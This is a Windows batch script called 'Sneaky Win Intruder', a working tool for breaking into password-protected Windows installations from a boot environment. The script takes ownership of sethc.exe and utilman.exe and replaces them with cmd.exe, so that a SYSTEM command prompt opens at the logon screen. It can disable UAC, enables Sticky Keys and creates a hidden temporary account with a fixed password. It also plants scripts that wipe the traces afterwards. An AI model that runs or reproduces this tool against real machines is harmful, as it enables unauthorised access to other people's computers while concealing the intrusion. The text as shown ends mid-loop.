@echo off > "%temp%\clean_next_boot.bat"

:: ************************************************************************************
:: Script: SneakyWinIntruder Type I
::         Swi.bat, adduser.bat, clean.bat, clean_next_boot.bat (auto generated)
:: Version: 0.9b
:: Creation Date: 20/6/2009
:: Last Modified: 9/9/2009
:: Author: wanderSick@C7PE
:: Email: wander.sic.k@gmail.com
:: web: wandersick.blogspot.com
:: Supported OS: Windows XP, 2003 [R2], Vista, 2008 [R2], 7...
:: Requirements: attrib.exe, find.exe, cacls.exe, taskkill.exe / wkill.exe + pskill.exe
::               takeown.exe / subinacl.exe, reg.exe, startx.exe (see Readme.txt)
:: Function: To crack into a password-protected Windows using the sethc.exe/utilman.exe
::           trick, thru the administrative command prompt shown at logon to create a
::           new temp account and refresh the screen. after having finished working
::           with the PC, restore the modifications e.g. UAC setting, last logon user
::           history, temp account, user profile, etc. Confirmed working offline on XP,
::           2003 [R2], Vista, 7, both Chinese and English, using PE1.x (NoName XPE,
::           Hiren's BootCD), PE2.0 (VistaPE), PE3.0 (C7PE), XP, 7 as base system.
::           (see Readme.txt)
:: ************************************************************************************

if not "%OS%"=="Windows_NT" echo "Windows version not supported" && goto :EOF

SETLOCAL ENABLEDELAYEDEXPANSION

:: debugging options
:: set debug=1
:: set debug2=1
if defined debug echo :: Debugging mode 1 is ON.
if defined debug2 echo on&set debug=1&echo :: Debugging mode 2 is ON.

title "Sneaky Win Intruder -- logging into Windows sneakily"

if /i "%~1" EQU /? goto _help

:: detects if working directory is wrong and corrects it if possible

:: grab directory where this is run
set workDir1=%cd%\
:: if user is using Enhanced Command Prompt Portable, first go back to its root for a quicker location of swi
if defined ECPP popd
:: grab directory where this resides
for /f "usebackq tokens=* delims=" %%i in (`dir /a /b /s %~nx0 2^>nul`) do @set workDir2=%%~dpi
if "%workDir2%"=="" echo.&echo  ** ERROR: Working directory incorrect and cannot be corrected. &echo.&echo  "%~nx0" cannot be found in "%CD%".&echo.&goto :EOF
:: this line is required to keep macro of ECPP working.
if defined ECPP pushd Exe
:: if they don't equal, correct the working dir by changing to the dir where this is found
if /i "%workDir1%" NEQ "%workDir2%" (
	set pushdBit=1
	pushd "%workDir2%"
)
:: reminder: requires popd at the end of script

set PATH=%PATH%;%CD%\3rdparty;%CD%\subscripts
set PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

:: detect winpe
reg query "hklm\software\microsoft\windows nt\currentversion" /v systemroot | find /i "x:\"
if %errorlevel% EQU 0 (set winpe=1)
reg query "hklm\software\microsoft\windows nt\currentversion" | find /i "preinstallation"
if %errorlevel% EQU 0 (set winpe=1)

:start
cls
echo.
echo                      - Sneaky Win Intruder Type I v0.9 -  
echo.
echo     :: What? This is a script meant to be run under Windows PE or so long
echo        as applying to an external Windows source. It allows logging on to
echo        a password-protected Windows by adding a new user instead of
echo        modifying existing ones.
echo.
echo     :: How? The concept is to replace sethc[utilman].exe with cmd.exe offline so
echo        that hitting SHIFT 5 times at logon screen can bring up a command
echo        prompt with administrator rights, where entering "ADDUSER" makes
echo        a temporary new account. Logon user/pass: temp/Password12!
echo.
echo        After logon, you can clean up all traces entering "CLEAN".
echo        Undeletable files will be deleted at the next logon.
echo.
echo     :: Depend on: cacls reg taskkill/wkill+pskill takeown/subinacl startx
echo.
echo     :: Use type II instead of type I where Stick Keys is disabled
echo        Both scripts can be applied together.

echo ______________________________________________________________
echo.
echo :: Please take note of the following before continuing:
echo.
echo    - For Vista and later OS, run this as administrator
echo ______________________________________________________________
echo.

echo.
pause
:menuMain
cls
echo.
echo :: Sneaky Win Intruder Menu
echo.
echo    1. Technique I -- replacing sethc.exe
echo.
echo    2. Technique II -- service creation
echo.
echo    3. Unattended (apply both w/default options)
echo.
echo    4. Clean up
echo.
echo    5. Display documentation
echo.
echo    6. Check for updates
echo.
echo    A. Exit
echo.
echo    B. Reboot
echo.

call _choiceMulti.bat /msg ":: Please make a choice: [1,2,3,4,5,6,A,B] " /button 123456AB /errorlevel 8

if "%errorlevel%"=="8" (
	@if defined winpe (
		exit
	) else (
		shutdown -r -t 0
	)
)
if "%errorlevel%"=="7" cls&goto :EOF
if "%errorlevel%"=="6" call :_update&goto menu
if "%errorlevel%"=="5" (call :_help)&goto menu
if "%errorlevel%"=="4" (call ".\subscripts\clean.bat")&goto menu
if "%errorlevel%"=="3" set typeII=1&set typeI=1&unattended=1
if "%errorlevel%"=="2" set typeII=1&goto typeII
if "%errorlevel%"=="1" set typeI=1

goto _menuChooseWin

:start2


echo.
echo #  Comparing target Windows and local Windows
echo.
if /i "%windir:\=%" EQU "%userwindir:\=%" (
	echo _____________________________________________________________________________
	echo 
	echo #  Warning: You've specified a local Windows: %windir%
	echo.
	echo #  Tip: Be careful not to specify the source Windows you're now using but
	echo    the target. Doing it wrong could lead to others tampering with your PC
	echo    without logging on (unless that's your purpose in the first place...)
	echo.
	REM call _choiceYN "Are to sure to continue? [Y,N] " N 60
	REM if %errorlevel% NEQ 0 goto start
)

if not defined typeII (
	if defined typeI (
		call _choiceYN ":: Swi Type I is to be applied on %userwindir%. Are you sure? [Y,N] " N 60
		if !errorlevel! NEQ 0 goto start
	) else (
		REM no Swi specified
		goto start
	)
) else (
	if defined typeI (
		call _choiceYN ":: Swi Type I and II are to be applied on %userwindir%. Are you sure? [Y,N] " N 60
		if !errorlevel! NEQ 0 goto start
	) else (
		call _choiceYN ":: Swi Type II is to be applied on %userwindir%. Are you sure? [Y,N] " N 60
		if !errorlevel! NEQ 0 (
			goto start
		) else (
			goto typeII
		)
	)
)

echo.
echo #  Checking if sethc.exe exists in target Windows.
echo.
if NOT exist %userwindir%\system32\sethc.exe (
echo.
echo #  ERROR: sethc.exe not in %userwindir%\system32\sethc.exe. Any mistake?
echo.
pause
goto start
)

echo.
echo #  Checking if script has been applied before
echo.
if exist "%userwindir%\system32\clean.bat" (
	echo _____________________________________________________________________________
	echo.
	echo #  INFO: clean1.bat is found in "%userwindir%\system32", which means the batch
	echo          might've already been applied, or not cleanly removed last time.
	echo.
	echo #  To be continued in a few secs...
	echo.
	(timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1)
) else if exist "%userwindir%\system32\clean1.bat" (
	echo _____________________________________________________________________________
	echo.
	echo #  INFO: clean1.bat is found in "%userwindir%\system32", which means the batch
	echo          might've already been applied, or not cleanly removed last time.
	echo.
	echo #  To be continued in a few secs...
	echo.
	(timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1)
)

echo.
echo #  Detecting if backup files exist in target Windows
echo.

dir "%userwindir%\system32\sethc.bac*" >nul 2>&1
if %errorlevel% EQU 0 (
	echo _____________________________________________________________________________
	echo.
	echo #  INFO: sethc.backup already exists. While you continue, SWI will try to
	echo          restore from system protected files first, then the oldest backup.
	echo.
	echo #  To be continued in a few secs...
	echo.
	(timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1)
)
dir "%userwindir%\system32\utilman.bac*" >nul 2>&1
if %errorlevel% EQU 0 (
	echo _____________________________________________________________________________
	echo.
	echo #  INFO: utilman.backup already exists. While you continue, SWI will try to
	echo          restore from system protected files first, then the oldest backup.
	echo.
	echo #  To be continued in a few secs...
	echo.
	(timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1)
)

echo.
echo #  Checking if required executables exists.
echo.

reg >nul 2>&1
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: reg.exe not in PATH. If you use Windows 2000, copy it to
	echo           '3rdparty' folder from a Windows XP system.
	echo.
	pause&set requiredExeMissing=1
)

cacls >nul 2>&1 
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: cacls.exe not in PATH. If you use Windows PE, make sure it is 
	echo           copied to '3rdparty' folder from a Windows XP system.
	echo.
	pause&set requiredExeMissing=1
)

attrib >nul 2>&1 
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: attrib.exe not in PATH. If you use Windows PE 1.x, make sure it is copied.
	echo           to '3rdparty' folder from a Windows XP system.
	echo.
	pause&set requiredExeMissing=1
	goto start
)

find >nul 2>&1 
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: find.exe not in PATH. If you use Windows PE 1.x, make sure it is copied
	echo           to '3rdparty' folder from a Windows XP system.
	echo.
	pause&set requiredExeMissing=1
	goto start
)

wkill >nul 2>&1
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot find wkill.exe. Please download from
	echo             www.alter.org.ua and put it in '3rdparty' folder.
	echo             It is for stopping executables if taskkill is not available.
	echo.
	echo #  This may not be critical, so this batch will let you continue.
	echo.
	pause
)

if not exist ".\3rdparty\pskill.exe"  (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot find pskill.exe. Please download from microsoft
	echo             sysinternals and put it in '3rdparty' folder.
	echo             It is for stopping logonUI.exe when taskkill isn't available.
	echo.
	echo #  This may not be critical, so this batch will let you continue.
	echo.
	pause
)


if not exist ".\3rdparty\movefile.exe"  (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot find movefile.exe. Please download from microsoft
	echo             sysinternals and put it in '3rdparty' folder.
	echo             It is for cleaning up part of user profile.
	echo.
	echo #  This may not be critical, so this batch will let you continue.
	echo.
	pause
)

if not exist ".\3rdparty\startx.exe" (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot find StartX.exe. Please download from 
	echo             www.naughter.com/startx.html and put it in '3rdparty' folder.
	echo             It is for automatic background cleanup.
	echo.
	echo #  This may not be critical, so this batch will let you continue.
	echo.
	pause
)

:: the following are required by swi typeII

sc start >nul 2>&1
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: need sc.exe in PATH or "3rdparty" folder. Please get it from XP.
	echo.
	pause&set requiredExeMissing=1
)

if not exist ".\3rdparty\srvany.exe" (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: need srvany.exe in "3rdparty" folder from Windows Resource Kit.
	echo.
	pause&set requiredExeMissing=1
)

:: let all the exe existence checkings finish before this:
if defined requiredExeMissing goto start

echo.
echo #  Checking for administrator rights.
echo.
:: ex: attrib %windir%\system32 -h | find /i "access denied"
attrib %windir%\system32 -h | find /i "system32"
if %errorlevel% EQU 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Not an administrator on current Windows.
	echo                 For Vista/7 with UAC, run this as administrator.
	echo.
	echo #  Alternatively, run this from Windows PE.
	echo.
	goto end
)

:: typeI begins

echo.
echo #  Loading target registry
echo.
reg load HKLM\swi1HKLM %userwindir%\system32\config\software
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't load registry: %userwindir%\system32\config\software
	goto end
)

reg load HKLM\swi1DefaultUser %userwindir%\system32\config\default
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Can't load registry: %userwindir%\system32\config\default
	echo.
	echo #  You may continue but Sticky Keys can't be guaranteed enabled.
	pause
	goto skipSticky
)

for /f "usebackq tokens=3 skip=2" %%i in (`reg query "HKLM\swi1DefaultUser\Control Panel\Accessibility\StickyKeys" /v Flags`) do (
	@if "%%i" EQU "506" (
		echo.
		echo #  INFO: Sticky Keys is found DISABLED for the target system account.
		echo.
	) else if "%%i" EQU "510" (
		echo.
		echo #  INFO: Sticky Keys is found ENABLED for the target system account.
		echo.
		goto skipSticky
	) else (
		echo.
		echo #  INFO: Sticky Keys for the target system account is in an unknown state.
		echo.	
	)
)

echo.
echo #  Confirming Sticky Keys is enabled for the system account of target Windows.
echo.
reg add "HKLM\swi1DefaultUser\Control Panel\Accessibility\StickyKeys" /v Flags /t REG_SZ /d 510 /f

:skipSticky

:: real-time generate the next boot cleanup file, due to the target may not need UAC to be reenabled

:: (By the way, I could have chosen another way of achieving this goal -- to write a file to target
:: system only if UAC is enabled -- see if defined typeI type nul > %windir%\typeI for this.)
echo.   
echo #  Preparing on-boot cleanup file  
echo.   
echo @echo off   >> "%temp%\clean_next_boot.bat"
echo set typeI=1
echo.     >> "%temp%\clean_next_boot.bat"
echo rem #  This is the latter part of cleanup script for SWI   >> "%temp%\clean_next_boot.bat"
echo.     >> "%temp%\clean_next_boot.bat"
echo rem #  remove temp user profile     >> "%temp%\clean_next_boot.bat"
echo cd /d "%%userprofile%%" ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
echo cd.. ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
echo.     >> "%temp%\clean_next_boot.bat"
echo rd /s /q "temp" ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
echo.     >> "%temp%\clean_next_boot.bat"

echo.
echo #  Detecting target Windows version
echo.
for /f "usebackq tokens=3 skip=2" %%i in (`reg query "HKLM\swi1HKLM\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion`) do set winver=%%i
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Cannot query registry for Windows version.
	goto end
)

echo.
echo #  Windows version %winver% detected.
echo.

if /i NOT %winver% geq 6 (
	echo rem #  remove StartX     >> "%temp%\clean_next_boot.bat"
	echo del "%%systemroot%%\system32\startx.exe" /f /q ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
	echo.     >> "%temp%\clean_next_boot.bat"
	echo rem #  remove itself     >> "%temp%\clean_next_boot.bat"
	echo del "%%systemroot%%\system32\clean_next_boot.bat" /f /q ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
	goto oldwin
)

:: :utilman

echo _____________________________________________________________________________
echo 
echo :: Windows is Vista or later.
echo.
echo :: Would you like to replace utilman.exe as well? (Default: Y)
echo.
echo    Utilman.exe is responsible for the accessbility tools at logon screen,
echo    which can be invoked by clicking an icon at bottom left corner or
echo    "Windows key + U".
echo.
echo    By replacing both sethc.exe and utilman.exe, you have a higher chance of
echo    getting into the target system.
echo.
call _choiceYN ":: Input your answer [Y,N]: " Y 60
if "%errorlevel%" EQU "0" set utilman=1
goto skipUtilman

:: set /p uac=
:: if /i "%uac%"=="n" goto skipUtilman
:: if /i "%uac%"=="y" set utilman=1&goto skipUtilman
:: goto utilman

:skipUtilman
for /f "usebackq tokens=3 skip=2" %%i in (`reg query HKLM\swi1HKLM\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`) do set uacBit=%%i
if "%uacbit%"=="0x0" (
	echo.
	echo #  Target's UAC is off already.
	echo.
	echo rem #  remove StartX     >> "%temp%\clean_next_boot.bat"
	echo del "%%systemroot%%\system32\startx.exe" /f /q ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
	echo.     >> "%temp%\clean_next_boot.bat"
	echo rem #  remove itself     >> "%temp%\clean_next_boot.bat"
	echo del "%%systemroot%%\system32\clean_next_boot.bat" /f /q ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
	goto skipUAC
)

:: :UACselect
echo _____________________________________________________________________________
echo 
echo :: UAC is on. Disable it for trouble-free operation? (Default: Y)
echo.
echo    If you disable it, it will be automatically re-enabled by the cleanup script.
echo.
call _choiceYN ":: Input your answer [Y,N]: " Y 60
if "%errorlevel%" NEQ "0" goto skipUAC

:: set /p uac=#  Input your answer [y/n]: 
:: if /i "%uac%"=="n" goto skipUAC
:: if /i "%uac%"=="y" goto disableUAC
:: goto UACselect

:: :disableUAC

reg.exe ADD HKLM\swi1HKLM\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

echo rem #  Enable UAC    >> "%temp%\clean_next_boot.bat"
echo reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f    >> "%temp%\clean_next_boot.bat"
echo.     >> "%temp%\clean_next_boot.bat"
echo rem #  remove StartX     >> "%temp%\clean_next_boot.bat"
echo del "%%systemroot%%\system32\startx.exe" /f /q ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"
echo.     >> "%temp%\clean_next_boot.bat"
echo rem #  remove itself     >> "%temp%\clean_next_boot.bat"
echo del "%%systemroot%%\system32\clean_next_boot.bat" /f /q ^>nul 2^>^&1     >> "%temp%\clean_next_boot.bat"


:skipUAC

echo.
echo #  Checks if either takeown.exe or subinacl.exe exists
echo.

takeown >nul 2>&1
if %errorlevel% EQU 9009 (
	echo.
	echo #  INFO: takeown.exe not found in PATH.
	echo.
	echo #  If you use older Windows PE or XP, make sure it is copied.
	echo.
	goto subinacl
)
echo.
echo #  Take ownership of sethc.exe using takeown.exe.
echo.
takeown /F "%userwindir%\system32\sethc.exe" /A
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Cannot take ownership.
	goto end
)

if defined utilman (
	echo.
	echo #  Take ownership of utilman.exe using takeown.exe.
	echo.
	takeown /F "%userwindir%\system32\utilman.exe" /A
	@if !errorlevel! NEQ 0 (
		echo _____________________________________________________________________________
		echo 
		echo #  FATAL ERROR: Cannot take ownership.
		goto end
	)	
)
goto cacls

:subinacl
subinacl >nul 2>&1
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: subinacl.exe also not found in PATH.
	echo.
	echo #  FATAL ERROR: You don"t have either takeown.exe or subinacl.exe in PATH.
	echo.
	echo    Download subinacl.exe from Microsoft, or get takeown.exe from Windows 2003
	goto end
)
echo.
echo #  Take ownership of sethc.exe using subinacl.exe.
echo.
subinacl /noverbose /file "%userwindir%\system32\sethc.exe" /setowner="Administrators"

if defined utilman (
	echo.
	echo #  Take ownership of utilman.exe using subinacl.exe
	echo.
	subinacl /noverbose /file "%userwindir%\system32\utilman.exe" /setowner="Administrators"
)

:cacls

echo.
echo #  Grant admin right on sethc.exe.
echo.
cacls "%userwindir%\system32\sethc.exe" /grant administrators:F /E
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't grant right on sethc.exe using cacls.
	goto end
)

if defined utilman (
	echo.
	echo #  Grant admin right on utilman.exe.
	echo.
	cacls "%userwindir%\system32\utilman.exe" /grant administrators:F /E
	@if !errorlevel! NEQ 0 (
		echo _____________________________________________________________________________
		echo 
		echo #  FATAL ERROR: Can't grant right on utilman.exe using cacls.
		goto end
	)
)

:oldwin

echo.
echo #  Unload target Windows registry
echo.
reg unload HKLM\swi1HKLM
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot unload target Windows hive. Still in use? Unload it manually.
	echo.
	pause
)

reg unload HKLM\swi1DefaultUser
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot unload target Windows hive. Still in use? Unload it manually.
	echo.
	pause
)

:: random number to minimize the chance of overwriting an existing sethc.exe
:: during cleanup as a result of running this script over 1 time w/o cleanup

echo.
echo #  Rename sethc.exe as sethc.backup.random.number
echo.
rename "%userwindir%\system32\sethc.exe" sethc.backup.%random%
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't rename sethc.exe to a different file name.
	goto end
)

if defined utilman (
	echo.
	echo #  Rename utilman.exe as utilman.backup.random.number
	echo.
	rename "%userwindir%\system32\utilman.exe" utilman.backup.%random%
	@if !errorlevel! NEQ 0 (
		echo _____________________________________________________________________________
		echo 
		echo #  FATAL ERROR: Can't rename utilman.exe to a different file name.
		goto end
	)
)

echo.
echo #  Copy and rename cmd.exe as sethc.exe
echo.
copy "%userwindir%\system32\cmd.exe" "%userwindir%\system32\sethc.exe" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't copy cmd.exe as sethc.exe.
	goto end
)

if defined utilman (
	echo.
	echo #  Copy and rename cmd.exe as utilman.exe
	echo.
	copy "%userwindir%\system32\cmd.exe" "%userwindir%\system32\utilman.exe" /y
	@if !errorlevel! NEQ 0 (
		echo _____________________________________________________________________________
		echo 
		echo #  FATAL ERROR: Can't copy cmd.exe as utilman.exe.
		goto end
	)
)

:: copy required exe's to %userwindir%\system32\swi

echo.
echo #  Copy "choice.exe" to "%userwindir%\system32\Swi"
echo.
copy ".\3rdparty\choice.exe" "%userwindir%\system32\Swi\choice.exe" /y
if %errorlevel% NEQ 0 (
	echo.
	echo #  INFO: Can't copy "choice.exe" to "%userwindir%\system32\Swi"
	echo.
)

echo.
echo #  Copy "pskill.exe" to "%userwindir%\system32\Swi"
echo.
copy ".\3rdparty\pskill.exe" "%userwindir%\system32\Swi\pskill.exe" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  INFO: Can't copy "pskill.exe" to "%userwindir%\system32\Swi"
	echo.
	echo #  If you"re sure target system has taskkill.exe then it is OK.
	echo.
)

echo.
echo #  Copy "wkill.exe" to "%userwindir%\system32\Swi"
echo.
copy ".\3rdparty\wkill.exe" "%userwindir%\system32\Swi\wkill.exe" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  INFO: Can't copy "wkill.exe" to "%userwindir%\system32\Swi"
	echo.
	echo #  If you"re sure target system has taskkill.exe then it is OK.
	echo.
)

echo.
echo #  Copy "movefile.exe" to "%userwindir%\system32\Swi"
echo.
copy ".\3rdparty\movefile.exe" "%userwindir%\system32\Swi\movefile.exe" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  INFO: Can't copy "movefile.exe" to "%userwindir%\system32\Swi"
	echo.
	echo #  User profile cleanup might fail.
	echo.
)

:: only startx is not copied to swi, due to being used in the last cleanup stage.
echo.
echo #  Copy "StartX.exe" to "%userwindir%\system32"
echo.
copy ".\3rdparty\startx.exe" "%userwindir%\system32\startx.exe" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  ERROR: Can't copy "StartX.exe" to "%userwindir%\system32"
	echo.
	echo #  You may continue but without it the last cleanup batch won't run properly.
	echo.
	pause
)

:: IF "rd temp /q /s" works for last cleanup, no need the below
:: new: echo.
:: new: echo #  Copy "subinacl.exe" to "%userwindir%\system32"
:: new: echo.
:: new: copy subinacl.exe "%userwindir%\system32\subinacl.exe" /y
:: new: if %errorlevel% NEQ 0 (
:: new: echo.
:: new: echo #  INFO: Can't copy "subinacl.exe" to "%userwindir%\system32"
:: new: echo.
:: new: echo #  If you"re sure target system has takeown.exe then it is OK.
:: new: echo.
:: new: )



:: copy batches to %userwindir%\system32 (note: not to \swi, except _choiceYN and _choiceMulti)

echo.
echo #  Copy "_choiceYN.bat" to "%userwindir%\system32"
echo.
:: for legacy support (adduser1)
copy ".\subscripts\_choiceYN.bat" "%userwindir%\system32\Swi\_choiceYN.bat" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't copy "_choiceYN.bat" to "%userwindir%\system32\Swi"
	echo.
	goto end
)

echo.
echo #  Copy "_choiceMulti.bat" to "%userwindir%\system32"
echo.
:: for legacy support (adduser1)
copy ".\subscripts\_choiceMulti.bat" "%userwindir%\system32\Swi\_choiceMulti.bat" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't copy "_choiceMulti.bat" to "%userwindir%\system32\Swi"
	echo.
	goto end
)


echo.
echo #  Copy "adduser.bat" to "%userwindir%\system32"
echo.
:: for legacy support (adduser1)
copy ".\subscripts\adduser.bat" "%userwindir%\system32\adduser1.bat" /y
copy ".\subscripts\adduser.bat" "%userwindir%\system32\adduser.bat" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Can't copy "adduser.bat" to "%userwindir%\system32\Swi"
	echo.
	goto end
)

echo.
echo #  Copy "clean.bat", "clean_next_boot.bat" to "%userwindir%\system32"
echo.
:: for legacy support (clean1)
copy ".\subscripts\clean.bat" "%userwindir%\system32\clean1.bat" /y
copy ".\subscripts\clean.bat" "%userwindir%\system32\clean.bat" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Can't copy "clean.bat" to %userwindir%\system32
	echo.
	echo #  You may leave it uncleaned, however.
	echo.
	pause
)
:: note it is real-time generated copied from %temp%
copy "%temp%\clean_next_boot.bat" "%userwindir%\system32\clean_next_boot.bat" /y
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Can't copy "%temp%\clean_next_boot.bat" to %userwindir%\system32
	echo.
	echo #  You may leave it uncleaned, however.
	echo.
	pause
)
echo _____________________________________________________________________________
echo.
echo :: Swi Type I has finished. Batch will continue in a few secs...
echo.
(timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1)

:typeII
if not defined typeII goto finish



:finish

:: this is for clean.bat identifying the Swi type to clean up
if defined typeI type nul > "%userwindir%\system32\Swi\typeI"
if defined typeII type nul > "%userwindir%\system32\Swi\typeII"

echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo. 
echo                    - Operation Part 1 of 3 Finished !! -  
echo.
echo     :: Part2 - It is now your turn to reboot PC and hit SHIFT button 5
echo        times to bring up the command prompt, where you enter "ADDUSER"
echo        to create a temporary new user and refresh welcome screen.
echo.
echo        Please write down the following credentials:
echo.
echo         - Username: temp
echo         - Password: Password12^! ^(Case sensitive!^)
echo.
echo     :: Part3 - To clean up after working with the PC, enter "CLEAN" at
echo        the "Run" dialog or "Start Search" (for Vista/7)
echo.
echo     :: If you want, you can also run SWI Type II to minimize the chance ***
echo        of failure. Both scripts were made to co-exist.
echo.
:end
echo.
echo #  Script will exit.
echo.
pause
:: return from work dir correction
if defined pushdBit popd&set pushdBit=
ENDLOCAL
goto :EOF

:: procedures and subroutines

:_update

setlocal ENABLEDELAYEDEXPANSION

if /i "%1"=="/ud" echo.&echo.&echo                             .. Please wait ..

pushd %Temp%

:: REMINDER: keep "Sneaky Win Intruder 2.0 Final" on server

for %%i in ("sneaky+win+intruder+2.0+final" "sneaky+win+intruder+2.0a" "sneaky+win+intruder+2.1" "sneaky+win+intruder+2.5" "sneaky+win+intruder+3.0") do (
	del ecppUpdate.tmp /F /Q >nul 2>&1
	wget --output-document=ecppUpdate.tmp --include-directories=www.google.com --accept=html -r -N -t2 -l2 -E -e robots=off - -T 200 -H -U "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040613 Firefox/0.8.0+" http://www.google.com/search?as_q=^&hl=en-US^&num=10^&as_epq=%%~i^&as_oq=^&as_eq=^&lr=^&cr=^&as_ft=i^&as_filetype=^&as_qdr=all^&as_occt=any^&as_dt=i^&as_sitesearch=wandersick.blogspot.com >nul 2>&1
	@if !errorlevel! NEQ 0 (
		@if /i "%1"=="/ud" echo.&echo :: An error occured during update check^^^! Verify Internet connectivity.&echo.&echo :: Going back in a few seconds...&((timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1))
	)
	REM check if the downloaded page is empty (i.e. actually not downloaded)
	@for /f "usebackq tokens=* delims=" %%a in (`type ecppUpdate.tmp`) do set udContent=%%a
	find /i "did not match any documents" "ecppUpdate.tmp" >nul 2>&1
	@if !errorlevel! EQU 0 (
		set updateFound=false
	) else (
		@if "!udContent!"=="" (
			set updateFound=error
		) else (
			set updateFound=true&goto updateFound
		)
	)
)
:updateFound
if defined debug echo updateFound: %updateFound%
if /i "%updateFound%"=="false" (
	@if /i "%1"=="/ud" echo.&echo                         **  No update was found **&echo.&echo.&echo :: You may check manually at wandersick.blogspot.com&echo.&echo :: Going back in a few seconds...&((timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1))
) else if /i "%updateFound%"=="error" (
	echo.&echo :: An error occured during update check^^^! Verify Internet connectivity.&echo.&echo :: Going back in a few seconds...&((timeout /T 6 >nul 2>&1) || (ping -n 6 -l 2 127.0.0.1 >nul 2>&1))
) else if /i "%updateFound%"=="true" (
	REM beep beep
	echo 
	REM flashes taskbar
	start "" "_winflash_wget.exe"
	call _choiceYn ":: A new version seems available. Visit wandersick.blogspot.com now? [Y,N]" N 20
	@if !errorlevel! EQU 0 start http://wandersick.blogspot.com
)
popd
endlocal
goto :EOF

:_menuChooseWin
if not defined debug cls
echo.
echo :: Select how to specify target Windows:
echo.
echo    1. Automatically search for Windows
echo.
echo    2. Manually specify path
echo.
echo    A. Go back
echo.

call _choiceMulti.bat /msg ":: Please make a choice: [1,2,A] " /button 12A /errorlevel 3
if "%errorlevel%"=="3" goto menuMain
if "%errorlevel%"=="2" echo ______________________________________________________________&goto manual
if "%errorlevel%"=="1" goto auto

:manual
echo.
echo :: What is the target Windows directory? e.g. E:\Windows
echo.
set /p userwindir=:: Enter here, or go back (A): 

:: removing quotes
for %%i in (%userwindir%) do set userwindir=%%~i

if /i "%userwindir%"=="back" goto _menuChooseWin
if /i "%userwindir%"=="a" goto _menuChooseWin
if /i "%userwindir%"=="s" goto auto
if /i "%userwindir%"=="search" goto auto
:: some input checking
echo %userwindir% | find /i ":\" >nul 2>&1
if %errorlevel% NEQ 0 cls&goto manual
goto start2

:auto
if not defined debug cls
:: dir scan 1
set count=0
for %%i in (B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
if exist %%i:\Windows.old/Windows\nul (set /a count+=1 && set SWI!count!=!count!=%%i:\Windows.old\Windows)
